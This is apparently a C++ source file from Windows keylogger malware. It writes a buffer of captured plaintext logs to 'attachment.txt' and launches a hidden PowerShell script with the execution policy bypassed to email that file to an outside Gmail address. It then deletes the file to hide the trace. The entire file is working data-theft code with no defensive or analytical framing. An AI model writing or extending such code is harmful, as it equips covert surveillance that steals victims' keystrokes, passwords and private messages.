#include <cstdio>
#include <mutex>
#include "../include/memory.h"
#include <string>
#include <windows.h>

void save_logs_to_file() {
    std::lock_guard<std::mutex> lock(g_logMutex);
    if (!g_plainLogs.empty()) {
        FILE* fp = fopen("attachment.txt", "a+"); // File saved in the current directory
        if (fp) {
            fwrite(g_plainLogs.data(), 1, g_plainLogs.size(), fp);
            fclose(fp);
            g_plainLogs.clear();
        }
    }
}

void send_email() {

    std::wstring command =
        L"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"email.ps1\" "
        L"-Username MyUserName -Password MyPassword "
        L"-attachmentpath \"attachment.txt\" "
        L"-email \"receiver@gmail.com\"";

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessW(
        NULL,
        (LPWSTR)command.c_str(),
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // Delete the file after sending the email
    DeleteFileW(L"attachment.txt");
}